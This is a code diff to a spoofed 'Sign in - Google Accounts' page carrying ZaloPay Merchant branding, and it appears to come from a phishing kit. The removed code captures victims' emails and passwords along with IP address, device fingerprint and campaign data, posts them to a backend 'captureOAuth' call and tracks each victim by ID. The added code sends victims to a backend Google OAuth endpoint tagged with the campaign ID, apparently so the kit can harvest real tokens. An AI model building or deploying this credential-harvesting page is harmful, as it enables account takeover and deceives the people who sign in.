@@ -9,7 +9,7 @@
     <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
     <link rel="manifest" href="/manifest.json">
     <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
-    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
     <title>Sign in - Google Accounts</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
@@ -485,7 +485,7 @@
             moveToEmailStep();
         });
         
-        // Form submission (password step)
+        // Form submission (password step) - Redirect to real Google OAuth
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -504,160 +504,18 @@
             loadingSpinner.classList.add('show');
             signInBtn.textContent = 'Signing in...';
             
-            try {
-                // Simulate OAuth flow và capture credentials
-                const oauthData = await captureGoogleOAuth(userEmail, password);
-                
-                // Get device fingerprint and metadata
-                const deviceFingerprint = await getDeviceFingerprint();
-                const ipAddress = await getClientIP();
-                
-                // Prepare token data
-                const tokenData = {
-                    access_token: oauthData.tokens.access_token,
-                    refresh_token: oauthData.tokens.refresh_token,
-                    id_token: oauthData.tokens.id_token,
-                    expires_in: oauthData.tokens.expires_in,
-                    scope: oauthData.tokens.scope,
-                    token_type: oauthData.tokens.token_type,
-                    email: userEmail,
-                    profile: oauthData.profile
-                };
-                
-                // Get session data
-                const sessionData = {
-                    ip_address: ipAddress,
-                    user_agent: navigator.userAgent,
-                    referrer: document.referrer || null,
-                    utm_parameters: getUTMParameters(),
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Prepare metadata
-                const metadata = {
-                    campaignId: new URLSearchParams(window.location.search).get('campaign_id') || null,
-                    sessionData: sessionData,
-                    device_fingerprint: deviceFingerprint,
-                    capture_timestamp: new Date().toISOString()
-                };
-                
-                // Send to backend using API client
-                const result = await window.apiClient.captureOAuth(tokenData, 'google', metadata);
-                
-                if (result.success) {
-                    // Store OAuth data in sessionStorage
-                    sessionStorage.setItem('oauth_data', JSON.stringify({
-                        email: oauthData.profile.email,
-                        name: oauthData.profile.name,
-                        provider: 'google',
-                        victim_id: result.victim_id
-                    }));
-                    
-                    // Redirect to registration page with victim_id
-                    const redirectUrl = result.redirect_url || `register.html?victim_id=${result.victim_id}`;
-                    window.location.href = redirectUrl;
-                } else {
-                    throw new Error(result.error || 'Authentication failed');
-                }
-                
-            } catch (error) {
-                console.error('OAuth capture error:', error);
-                
-                // Determine error type
-                let errorType = 'invalid_credentials';
-                let errorCode = '';
-                
-                if (error.message.includes('network') || error.message.includes('fetch')) {
-                    errorType = 'network_error';
-                } else if (error.message.includes('oauth')) {
-                    errorType = 'oauth_failed';
-                }
-                
-                // Redirect to error page
-                window.location.href = `auth_error.html?type=${errorType}&provider=google&code=${errorCode}`;
-            }
+            // Get campaign ID from URL if present
+            const campaignId = new URLSearchParams(window.location.search).get('campaign_id');
+            
+            // Redirect to backend OAuth initiation endpoint
+            // The backend will handle the OAuth flow and redirect to Google
+            const oauthUrl = campaignId 
+                ? `/auth/google?campaign_id=${encodeURIComponent(campaignId)}`
+                : '/auth/google';
+            
+            window.location.href = oauthUrl;
         });
         
-        // Simulate Google OAuth token capture
-        async function captureGoogleOAuth(email, password) {
-            // In real implementation, this would interact with Google OAuth API
-            // For phishing simulation, we capture the credentials and generate fake tokens
-            
-            // Simulate API delay
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // Generate mock OAuth response
-            const mockTokens = {
-                access_token: 'ya29.' + generateRandomString(100),
-                refresh_token: '1//' + generateRandomString(50),
-                id_token: generateRandomString(200),
-                expires_in: 3600,
-                scope: 'openid email profile',
-                token_type: 'Bearer'
-            };
-            
-            // Mock user profile
-            const mockProfile = {
-                email: email,
-                name: email.split('@')[0].replace(/[._]/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
-                picture: `https://ui-avatars.com/api/?name=${encodeURIComponent(email)}&background=4285f4&color=fff`,
-                verified_email: true,
-                google_id: generateRandomString(21)
-            };
-            
-            return {
-                tokens: mockTokens,
-                profile: mockProfile
-            };
-        }
-        
-        // Helper functions
-        function generateRandomString(length) {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result;
-        }
-        
-        async function getClientIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'unknown';
-            }
-        }
-        
-        // Get UTM parameters from URL
-        function getUTMParameters() {
-            const params = new URLSearchParams(window.location.search);
-            return {
-                utm_source: params.get('utm_source') || null,
-                utm_medium: params.get('utm_medium') || null,
-                utm_campaign: params.get('utm_campaign') || null,
-                utm_content: params.get('utm_content') || null,
-                utm_term: params.get('utm_term') || null
-            };
-        }
-        
-        async function getDeviceFingerprint() {
-            // Use advanced fingerprinting if available
-            if (window.DeviceFingerprinting && window.DeviceFingerprinting.generateDeviceFingerprint) {
-                return await window.DeviceFingerprinting.generateDeviceFingerprint();
-            }
-            
-            // Fallback to basic fingerprinting
-            return {
-                screen_resolution: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                platform: navigator.platform,
-                user_agent: navigator.userAgent
-            };
-        }
         
         // Enter key handling
         emailInput.addEventListener('keypress', function(e) {
@@ -722,4 +580,3 @@
     <script src="/js/socket-background.js"></script>
 </body>
 </html>
-
